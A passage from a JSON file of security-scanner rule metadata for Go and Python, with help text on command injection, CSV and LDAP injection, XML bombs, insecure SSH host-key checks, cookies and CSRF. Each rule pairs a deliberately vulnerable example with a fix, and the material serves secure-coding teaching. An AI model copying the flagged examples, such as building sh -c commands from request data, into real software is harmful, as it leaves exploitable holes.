{\n\t\treturn nil\n\t}\n\treturn errors.New(\"Invalid redirect\")\n}\n\n```\nThe check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.\n\nAddress this vulnerability by escaping `.` appropriately:\n\n\n```go\npackage main\n\nimport (\n\t\"errors\"\n\t\"net/http\"\n\t\"regexp\"\n)\n\nfunc checkRedirectGood(req *http.Request, via []*http.Request) error {\n\t// GOOD: the host of `req.URL` must be `example.com`, `www.example.com` or `beta.example.com`\n\tre := \"^((www|beta)\\\\.)?example\\\\.com/\"\n\tif matched, _ := regexp.MatchString(re, req.URL.Host); matched {\n\t\treturn nil\n\t}\n\treturn errors.New(\"Invalid redirect\")\n}\n\n```\nYou may also want to consider using raw string literals to avoid having to escape backslashes:\n\n\n```go\npackage main\n\nimport (\n\t\"errors\"\n\t\"net/http\"\n\t\"regexp\"\n)\n\nfunc checkRedirectGood2(req *http.Request, via []*http.Request) error {\n\t// GOOD: the host of `req.URL` must be `example.com`, `www.example.com` or `beta.example.com`\n\tre := `^((www|beta)\\.)?example\\.com/`\n\tif matched, _ := regexp.MatchString(re, req.URL.Host); matched {\n\t\treturn nil\n\t}\n\treturn errors.New(\"Invalid redirect\")\n}\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/command-injection": {
    "name": "Command built from user-controlled sources",
    "description": "Building a system command from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "go/command-injection",
    "tags": [
      "security",
      "external/cwe/cwe-078"
    ],
    "filename": "8a1fc84f-CommandInjection",
    "language": "go",
    "help": "# Command built from user-controlled sources\nIf a system command invocation is built from user-provided data without sufficient sanitization, a malicious user may be able to run commands to exfiltrate data or compromise the system.\n\n\n## Recommendation\nWhenever possible, use hard-coded string literals for commands and avoid shell string interpreters like `sh -c`.\n\nIf given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments.\n\nIf this is not possible, sanitize user input to avoid characters like spaces and various kinds of quotes that can alter the meaning of the command.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object:\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n\t\"os/exec\"\n)\n\nfunc handler(req *http.Request) {\n\timageName := req.URL.Query()[\"imageName\"][0]\n\toutputPath := \"/tmp/output.svg\"\n\tcmd := exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"imagetool %s > %s\", imageName, outputPath))\n\tcmd.Run()\n\t// ...\n}\n\n```\nThe handler extracts the image file name from the request and uses the image name to construct a shell command that is executed using ``` `sh -c` ```, which can lead to command injection.\n\nIt's better to avoid shell commands by using the `exec.Command` function directly, as shown in the following example:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc handler(req *http.Request) {\n\timageName := req.URL.Query()[\"imageName\"][0]\n\toutputPath := \"/tmp/output.svg\"\n\n\t// Create the output file\n\toutfile, err := os.Create(outputPath)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outfile.Close()\n\n\t// Prepare the command\n\tcmd := exec.Command(\"imagetool\", imageName)\n\n\t// Set the output to our file\n\tcmd.Stdout = outfile\n\n\tcmd.Run()\n}\n\n```\nAlternatively, a regular expression can be used to ensure that the image name is safe to use in a shell command:\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"regexp\"\n)\n\nfunc handler(req *http.Request) {\n\timageName := req.URL.Query()[\"imageName\"][0]\n\toutputPath := \"/tmp/output.svg\"\n\n\t// Validate the imageName with a regular expression\n\tvalidImageName := regexp.MustCompile(`^[a-zA-Z0-9_\\-\\.]+$`)\n\tif !validImageName.MatchString(imageName) {\n\t\tlog.Fatal(\"Invalid image name\")\n\t\treturn\n\t}\n\n\tcmd := exec.Command(\"sh\", \"-c\", fmt.Sprintf(\"imagetool %s > %s\", imageName, outputPath))\n\tcmd.Run()\n}\n\n```\nSome commands, like `git`, can indirectly execute commands if an attacker specifies the flags given to the command.\n\nTo mitigate this risk, either add a `--` argument to ensure subsequent arguments are not interpreted as flags, or verify that the argument does not start with `\"--\"`.\n\n\n```go\npackage main\n\nimport (\n\t\"log\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc handler(req *http.Request) {\n\trepoURL := req.URL.Query()[\"repoURL\"][0]\n\toutputPath := \"/tmp/repo\"\n\n\t// Sanitize the repoURL to ensure it does not start with \"--\"\n\tif strings.HasPrefix(repoURL, \"--\") {\n\t\tlog.Fatal(\"Invalid repository URL\")\n\t} else {\n\t\tcmd := exec.Command(\"git\", \"clone\", repoURL, outputPath)\n\t\terr := cmd.Run()\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n\n\t// Or: add \"--\" to ensure that the repoURL is not interpreted as a flag\n\tcmd := exec.Command(\"git\", \"clone\", \"--\", repoURL, outputPath)\n\terr := cmd.Run()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n"
  },
  "go/insecure-hostkeycallback": {
    "name": "Use of insecure HostKeyCallback implementation",
    "description": "Detects insecure SSL client configurations with an implementation of the `HostKeyCallback` that accepts all host keys.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "precision": "high",
    "id": "go/insecure-hostkeycallback",
    "tags": [
      "security",
      "external/cwe/cwe-322"
    ],
    "filename": "5fdce85b-InsecureHostKeyCallback",
    "language": "go",
    "help": "# Use of insecure HostKeyCallback implementation\nThe `ClientConfig` specifying the configuration for establishing a SSH connection has a field `HostKeyCallback` that must be initialized with a function that validates the host key returned by the server.\n\nNot properly verifying the host key returned by a server provides attackers with an opportunity to perform a Machine-in-the-Middle (MitM) attack. A successful attack can compromise the confidentiality and integrity of the information communicated with the server.\n\nThe `ssh` package provides the predefined callback `InsecureIgnoreHostKey` that can be used during development and testing. It accepts any provided host key. This callback, or a semantically similar callback, should not be used in production code.\n\n\n## Recommendation\nThe `HostKeyCallback` field of `ClientConfig` should be initialized with a function that validates a host key against an allow list. If a key is not on a predefined allow list, the connection must be terminated and the failed security operation should be logged.\n\nWhen the allow list contains only a single host key then the function `FixedHostKey` can be used.\n\n\n## Example\nThe following example shows the use of `InsecureIgnoreHostKey` and an insecure host key callback implementation commonly used in non-production code.\n\n\n```go\npackage main\n\nimport (\n\t\"golang.org/x/crypto/ssh\"\n\t\"net\"\n)\n\nfunc main() {}\n\nfunc insecureIgnoreHostKey() {\n\t_ = &ssh.ClientConfig{\n\t\tUser:            \"username\",\n\t\tAuth:            []ssh.AuthMethod{nil},\n\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\n\t}\n}\n\nfunc insecureHostKeyCallback() {\n\t_ = &ssh.ClientConfig{\n\t\tUser: \"username\",\n\t\tAuth: []ssh.AuthMethod{nil},\n\t\tHostKeyCallback: ssh.HostKeyCallback(\n\t\t\tfunc(hostname string, remote net.Addr, key ssh.PublicKey) error {\n\t\t\t\treturn nil\n\t\t\t}),\n\t}\n}\n\n```\nThe next example shows a secure implementation using the `FixedHostKey` that implements an allow-list.\n\n\n```go\npackage main\n\nimport (\n\t\"golang.org/x/crypto/ssh\"\n\t\"io/ioutil\"\n)\n\nfunc main() {}\n\nfunc secureHostKeyCallback() {\n\tpublicKeyBytes, _ := ioutil.ReadFile(\"allowed_hostkey.pub\")\n\tpublicKey, _ := ssh.ParsePublicKey(publicKeyBytes)\n\n\t_ = &ssh.ClientConfig{\n\t\tUser:            \"username\",\n\t\tAuth:            []ssh.AuthMethod{nil},\n\t\tHostKeyCallback: ssh.FixedHostKey(publicKey),\n\t}\n}\n\n```\n\n## References\n* Go Dev: [package ssh](https://pkg.go.dev/golang.org/x/crypto/ssh?tab=doc).\n* Common Weakness Enumeration: [CWE-322](https://cwe.mitre.org/data/definitions/322.html).\n"
  },
  "py/csv-injection": {
    "name": "Csv Injection",
    "description": "From user-controlled data saved in CSV files, it is easy to attempt information disclosure or other malicious activities when automated by spreadsheet software",
    "kind": "path-problem",
    "problem.severity": "error",
    "id": "py/csv-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-1236"
    ],
    "filename": "ca72b1e0-CsvInjection",
    "language": "python",
    "help": "# Csv Injection\nCSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.\n\nWhen a CSV format file is opened with a spreadsheet program such as Microsoft Excel or LibreOffice Calc. this software interprets entries beginning with `=` as formulas, which may attempt information exfiltration or other malicious activity when automatically executed by the spreadsheet software.\n\n\n## Recommendation\nWhen generating CSV output, ensure that formula-sensitive metacharacters are effectively escaped or removed from all data before storage in the resultant CSV. Risky characters include `=`(equal), `+`(plus), `-`(minus), and `@`(at).\n\n\n## Example\nThe following examples show the bad case and the good case respectively. In `bad1` method, the data provided by the user is directly stored in the CSV file, which may be attacked. But in the `good1` method, the program will check the data provided by the user, and process the data starting with `=`(equal), `+`(plus), `-`(minus), and `@`(at) characters safely.\n\n\n```python\n#!/usr/bin/env python\n# -*- coding: UTF-8 -*-\n\"\"\"\n@Desc   \uff1acsv injection\n\"\"\"\nimport copy\nimport csv\nfrom flask import Flask\nfrom flask import request\nfrom typing import List\n\napp = Flask(__name__)\n\n@app.route('/bad1')\ndef bad1():\n    csv_data = request.args.get('csv')\n    csvWriter = csv.writer(open(\"test.csv\", \"wt\"))\n    csvWriter.writerow(csv_data)\n    return \"bad1\"\n\n@app.route('/good1')\ndef good1():\n    csv_data = request.args.get('csv')\n    csvWriter = csv.writer(open(\"test.csv\", \"wt\"))\n    csvWriter.writerow(sanitize_for_csv(csv_data))\n    return \"good1\"\n\ndef sanitize_for_csv(data: str| List[str] | List[List[str]]):\n    def sanitize(item):\n        return \"'\" + item\n\n    unsafe_prefixes = (\"+\", \"=\", \"-\", \"@\")\n    if isinstance(data, str):\n        if data.startswith(unsafe_prefixes):\n            return sanitize(data)\n        return data\n    elif isinstance(data, list) and isinstance(data[0], str):\n        sanitized_data = copy.deepcopy(data)\n        for index, item in enumerate(data):\n            if item.startswith(unsafe_prefixes):\n                sanitized_data[index] = sanitize(item)\n        return sanitized_data\n    elif isinstance(data[0], list) and isinstance(data[0][0], str):\n        sanitized_data = copy.deepcopy(data)\n        for outer_index, sublist in enumerate(data):\n            for inner_index, item in enumerate(sublist):\n                if item.startswith(unsafe_prefixes):\n                    sanitized_data[outer_index][inner_index] = sanitize(item)\n        return sanitized_data\n    else:\n        raise ValueError(\"Unsupported data type: \" + str(type(data)))\n\n\nif __name__ == '__main__':\n    app.debug = True\n    app.run()\n```\n\n## References\n* OWASP: [CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection).\n* Common Weakness Enumeration: [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html).\n"
  },
  "py/csrf-protection-disabled": {
    "name": "CSRF protection weakened or disabled",
    "description": "Disabling or weakening CSRF protection may make the application vulnerable to a Cross-Site Request Forgery (CSRF) attack.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.8,
    "precision": "high",
    "id": "py/csrf-protection-disabled",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "d94e43be-CSRFProtectionDisabled",
    "language": "python",
    "help": "# CSRF protection weakened or disabled\nCross-site request forgery (CSRF) is a type of vulnerability in which an attacker is able to force a user to carry out an action that the user did not intend.\n\nThe attacker tricks an authenticated user into submitting a request to the web application. Typically this request will result in a state change on the server, such as changing the user's password. The request can be initiated when the user visits a site controlled by the attacker. If the web application relies only on cookies for authentication, or on other credentials that are automatically included in the request, then this request will appear as legitimate to the server.\n\nA common countermeasure for CSRF is to generate a unique token to be included in the HTML sent from the server to a user. This token can be used as a hidden field to be sent back with requests to the server, where the server can then check that the token is valid and associated with the relevant user session.\n\n\n## Recommendation\nIn many web frameworks, CSRF protection is enabled by default. In these cases, using the default configuration is sufficient to guard against most CSRF attacks.\n\n\n## Example\nThe following example shows a case where CSRF protection is disabled by overriding the default middleware stack and not including the one protecting against CSRF.\n\n\n```python\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    # 'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\n```\nThe protecting middleware was probably commented out during a testing phase, when server-side token generation was not set up. Simply commenting it back in will enable CSRF protection.\n\n\n## References\n* Wikipedia: [Cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery)\n* OWASP: [Cross-site request forgery](https://owasp.org/www-community/attacks/csrf)\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "py/xml-bomb": {
    "name": "XML internal entity expansion",
    "description": "Parsing user input as an XML document with arbitrary internal entity expansion is vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "py/xml-bomb",
    "tags": [
      "security",
      "external/cwe/cwe-776",
      "external/cwe/cwe-400"
    ],
    "filename": "f9eb5c46-XmlBomb",
    "language": "python",
    "help": "# XML internal entity expansion\nParsing untrusted XML files with a weakly configured XML parser may be vulnerable to denial-of-service (DoS) attacks exploiting uncontrolled internal entity expansion.\n\nIn XML, so-called *internal entities* are a mechanism for introducing an abbreviation for a piece of text or part of a document. When a parser that has been configured to expand entities encounters a reference to an internal entity, it replaces the entity by the data it represents. The replacement text may itself contain other entity references, which are expanded recursively. This means that entity expansion can increase document size dramatically.\n\nIf untrusted XML is parsed with entity expansion enabled, a malicious attacker could submit a document that contains very deeply nested entity definitions, causing the parser to take a very long time or use large amounts of memory. This is sometimes called an *XML bomb* attack.\n\n\n## Recommendation\nThe safest way to prevent XML bomb attacks is to disable entity expansion when parsing untrusted data. Whether this can be done depends on the library being used. Note that some libraries, such as `lxml`, have measures enabled by default to prevent such DoS XML attacks, so unless you have explicitly set `huge_tree` to `True`, no further action is needed.\n\nWe recommend using the [defusedxml](https://pypi.org/project/defusedxml/) PyPI package, which has been created to prevent XML attacks (both XXE and XML bombs).\n\n\n## Example\nThe following example uses the `xml.etree` XML parser provided by the Python standard library to parse a string `xml_src`. That string is from an untrusted source, so this code is vulnerable to a DoS attack, since the `xml.etree` XML parser expands internal entities by default:\n\n\n```python\nfrom flask import Flask, request\nimport xml.etree.ElementTree as ET\n\napp = Flask(__name__)\n\n@app.post(\"/upload\")\ndef upload():\n    xml_src = request.get_data()\n    doc = ET.fromstring(xml_src)\n    return ET.tostring(doc)\n\n```\nIt is not possible to guard against internal entity expansion with `xml.etree`, so to guard against these attacks, the following example uses the [defusedxml](https://pypi.org/project/defusedxml/) PyPI package instead, which is not exposed to such internal entity expansion attacks.\n\n\n```python\nfrom flask import Flask, request\nimport defusedxml.ElementTree as ET\n\napp = Flask(__name__)\n\n@app.post(\"/upload\")\ndef upload():\n    xml_src = request.get_data()\n    doc = ET.fromstring(xml_src)\n    return ET.tostring(doc)\n\n```\n\n## References\n* Wikipedia: [Billion Laughs](https://en.wikipedia.org/wiki/Billion_laughs).\n* Bryan Sullivan: [Security Briefs - XML Denial of Service Attacks and Defenses](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\n* Python 3 standard library: [XML Vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities).\n* Python 2 standard library: [XML Vulnerabilities](https://docs.python.org/2/library/xml.html#xml-vulnerabilities).\n* Common Weakness Enumeration: [CWE-776](https://cwe.mitre.org/data/definitions/776.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "py/incomplete-hostname-regexp": {
    "name": "Incomplete regular expression for hostnames",
    "description": "Matching a URL or hostname against a regular expression that contains an unescaped dot as part of the hostname might match more hostnames than expected.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "py/incomplete-hostname-regexp",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "dfdda0ff-IncompleteHostnameRegExp",
    "language": "python",
    "help": "# Incomplete regular expression for hostnames\nSanitizing untrusted URLs is a common technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nIf a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.\n\n\n## Recommendation\nEscape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.\n\n\n```python\nfrom flask import Flask, request, redirect\nimport re\n\napp = Flask(__name__)\n\nUNSAFE_REGEX = re.compile(\"(www|beta).example.com/\")\nSAFE_REGEX = re.compile(r\"(www|beta)\\.example\\.com/\")\n\n@app.route('/some/path/bad')\ndef unsafe(request):\n    target = request.args.get('target', '')\n    if UNSAFE_REGEX.match(target):\n        return redirect(target)\n\n@app.route('/some/path/good')\ndef safe(request):\n    target = request.args.get('target', '')\n    if SAFE_REGEX.match(target):\n        return redirect(target)\n\n```\nThe `unsafe` check is easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.\n\nThe `safe` check closes this vulnerability by escaping the `.` so that URLs of the form `wwwXexample.com` are rejected.\n\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/insecure-cookie": {
    "name": "Failure to use secure cookies",
    "description": "Insecure cookies may be sent in cleartext, which makes them vulnerable to interception.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "py/insecure-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-614",
      "external/cwe/cwe-1004",
      "external/cwe/cwe-1275"
    ],
    "filename": "c654315c-InsecureCookie",
    "language": "python",
    "help": "# Failure to use secure cookies\nCookies without the `Secure` flag set may be transmittd using HTTP instead of HTTPS, which leaves it vulnerable to being read by a third party.\n\nCookies without the `HttpOnly` flag set are accessible to JavaScript running in the same origin. In case of a Cross-Site Scripting (XSS) vulnerability, the cookie can be stolen by a malicious script.\n\nCookies with the `SameSite` attribute set to `'None'` will be sent with cross-origin requests, which can be controlled by third-party JavaScript code and allow for Cross-Site Request Forgery (CSRF) attacks.\n\n\n## Recommendation\nAlways set `secure` to `True` or add \"; Secure;\" to the cookie's raw value.\n\nAlways set `httponly` to `True` or add \"; HttpOnly;\" to the cookie's raw value.\n\nAlways set `samesite` to `Lax` or `Strict`, or add \"; SameSite=Lax;\", or \"; Samesite=Strict;\" to the cookie's raw header value.\n\n\n## Example\nIn the following examples, the cases marked GOOD show secure cookie attributes being set; whereas in the cases marked BAD they are not set.\n\n\n```python\nfrom flask import Flask, request, make_response, Response\n\n\n@app.route(\"/good1\")\ndef good1():\n    resp = make_response()\n    resp.set_cookie(\"name\", value=\"value\", secure=True, httponly=True, samesite='Strict') # GOOD: Attributes are securely set\n    return resp\n\n\n@app.route(\"/good2\")\ndef good2():\n    resp = make_response()\n    resp.headers['Set-Cookie'] = \"name=value; Secure; HttpOnly; SameSite=Strict\" # GOOD: Attributes are securely set \n    return resp\n\n@app.route(\"/bad1\")\n    resp = make_response()\n    resp.set_cookie(\"name\", value=\"value\", samesite='None') # BAD: the SameSite attribute is set to 'None' and the 'Secure' and 'HttpOnly' attributes are set to False by default.\n    return resp\n```\n\n## References\n* Detectify: [Cookie lack Secure flag](https://support.detectify.com/support/solutions/articles/48001048982-cookie-lack-secure-flag).\n* PortSwigger: [TLS cookie without secure flag set](https://portswigger.net/kb/issues/00500200_tls-cookie-without-secure-flag-set).\n* Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).\n* Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).\n* Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).\n"
  },
  "py/ldap-injection": {
    "name": "LDAP query built from user-controlled sources",
    "description": "Building an LDAP query from user-controlled sources is vulnerable to insertion of malicious LDAP code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "py/ldap-injection",
    "tags": [
      "security",
      "external/cwe/cwe-090"
    ],
    "filename": "d3b15619-LdapInjection",
    "language": "python",
    "help": "# LDAP query built from user-controlled sources\nIf an LDAP query or DN is built using string concatenation or string formatting, and the components of the concatenation include user input without any proper sanitization, a user is likely to be able to run malicious LDAP queries.\n\n\n## Recommendation\nIf user input must be included in an LDAP query or DN, it should be escaped to avoid a malicious user providing special characters that change the meaning of the query. In Python2, user input should be escaped with `ldap.dn.escape_dn_chars` or `ldap.filter.escape_filter_chars`, while in Python3, user input should be escaped with `ldap3.utils.dn.escape_rdn` or `ldap3.utils.conv.escape_filter_chars` depending on the component tainted by the user. A good practice is to escape filter characters that could change the meaning of the query (https://tools.ietf.org/search/rfc4515\\#section-3).\n\n\n## Example\nIn the following examples, the code accepts both `username` and `dc` from the user, which it then uses to build a LDAP query and DN.\n\nThe first and the second example uses the unsanitized user input directly in the search filter and DN for the LDAP query. A malicious user could provide special characters to change the meaning of these components, and search for a completely different set of values.\n\n\n```python\nfrom flask import request, Flask\nimport ldap\n\n\n@app.route(\"/normal\")\ndef normal():\n    unsafe_dc = request.args['dc']\n    unsafe_filter = request.args['username']\n\n    dn = \"dc={}\".format(unsafe_dc)\n    search_filter = \"(user={})\".format(unsafe_filter)\n\n    ldap_connection = ldap.initialize(\"ldap://127.0.0.1\")\n    user = ldap_connection.search_s(\n        dn, ldap.SCOPE_SUBTREE, search_filter)\n\n```\n\n```python\nfrom flask import request, Flask\nimport ldap3\n\n\n@app.route(\"/normal\")\ndef normal():\n    unsafe_dc = request.args['dc']\n    unsafe_filter = request.args['username']\n\n    dn = \"dc={}\".format(unsafe_dc)\n    search_filter = \"(user={})\".format(unsafe_filter)\n\n    srv = ldap3.Server('ldap://127.0.0.1')\n    conn = ldap3.Connection(srv, user=dn, auto_bind=True)\n    conn.search(dn, search_filter)\n\n```\nIn the third and fourth example, the input provided by the user is sanitized before it is included in the search filter or DN. This ensures the meaning of the query cannot be changed by a malicious user.\n\n\n```python\nfrom flask import request, Flask\nimport ldap\nimport ldap.filter\nimport ldap.dn\n\n\n@app.route(\"/normal\")\ndef normal():\n    unsafe_dc = request.args['dc']\n    unsafe_filter = request.args['username']\n\n    safe_dc = ldap.dn.escape_dn_chars(unsafe_dc)\n    safe_filter = ldap.filter.escape_filter_chars(unsafe_filter)\n\n    dn = \"dc={}\".format(safe_dc)\n    search_filter = \"(user={})\".format(safe_filter)\n\n    ldap_connection = ldap.initialize(\"ldap://127.0.0.1\")\n    user = ldap_connection.search_s(\n        dn, ldap.SCOPE_SUBTREE, search_filter)\n\n```\n\n```python\nfrom flask import request, Flask\nimport ldap3\nfrom ldap3.utils.dn import escape_rdn\nfrom ldap3.utils.conv import escape_filter_chars\n\n\n@app.route(\"/normal\")\ndef normal():\n    unsafe_dc = request.args['dc']\n    unsafe_filter = request.args['username']\n\n    safe_dc = escape_rdn(unsafe_dc)\n    safe_filter = escape_filter_chars(unsafe_filter)\n\n    dn = \"dc={}\".format(safe_dc)\n    search_filter = \"(user={})\".format(safe_filter)\n\n    srv = ldap3.Server('ldap://127.0.0.1')\n    conn = ldap3.Connection(srv, user=dn, auto_bind=True)\n    conn.search(dn, search_filter)\n\n```\n\n## References\n* OWASP: [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html).\n* OWASP: [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection).\n* SonarSource: [RSPEC-2078](https://rules.sonarsource.com/python/RSPEC-2078).\n* Python2: [LDAP Documentation](https://www.python-ldap.org/en/python-ldap-3.3.0/reference/ldap.html).\n* Python3: [LDAP Documentation](https://ldap3.readthedocs.io/en/latest/).\n* Wikipedia: [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection).\n* BlackHat: [LDAP Injection and Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf).\n* LDAP: [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n"
  },
  "py/untrusted-data-to-external-api": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "py/untrusted-data-to-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "7792de3c-UntrustedDataToExternalAPI",
    "language": "python",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a call to a method that is not defined in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the Python standard library or dependencies. The query will report the fully qualified name, along with `[position index]` or `[keyword name]`, to indicate the argument passing the untrusted data.\n\nNote that an excepted sink might not be included in the results, if it also defines a taint step. This is the case for `pickle.loads` which is a sink for the Unsafe Deserialization query, but is also a taint step for other queries.\n\nNote: Compared to the Java version of this query, we currently do not give special care to methods that are overridden in the source code.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPI` class and specify `getSafeCallable` to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a request parameter is read from the Flask `request` and then ultimately used in a call to the `flask.make_response` external API:\n\n\n```python\nfrom flask import Flask, request, make_response\napp = Flask(__name__)\n\n@app.route(\"/xss\")\ndef xss():\n    username = request.args.get(\"username\")\n    return make_response(\"Hello {}\".format(username))\n\n```\nThis is an XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from the Flask `request`.\n\n\n```python\nimport base64\nimport pickle\n\nfrom flask import Flask, request, make_response\napp = Flask(__name__)\n\n@app.route(\"/example\")\ndef profile():\n    raw_data = request.args.get(\"data\").encode('utf-8')\n    data = base64.decodebytes(raw_data)\n    obj = pickle.loads(data)\n    ...\n\n```\nIf the query reported the call to `base64.decodebytes` on line 10, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, the result of the Base64 decoding is pickled, which can result in remote code execution due to unsafe deserialization.\n\nNote that both examples are correctly handled by the standard taint tracking library and Unsafe Deserialization query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "py/log-injection": {
    "name": "Log Injection",
    "description": "Building log entries from user-controlled data is vulnerable to insertion of forged log entries by a malicious user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "py/log-injection",
    "tags": [
      "security",
      "external/cwe/cwe-117"
    ],
    "filename": "f6128ad9-LogInjection",
    "language": "python",
    "help": "# Log Injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user to create the appearance of multiple log entries. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are plain text then line breaks should be removed from user input, using for example `replace(old, new)` or similar. Care should also be taken that user input is clearly marked in log entries, and that a malicious user cannot cause confusion in other ways.\n\nFor log entries that will be displayed in HTML, user input should be HTML encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the example, the name provided by the user is recorded using the log output function (`logging.info` or `app.logger.info`, etc.). In these four cases, the name provided by the user is not provided The processing is recorded. If a malicious user provides 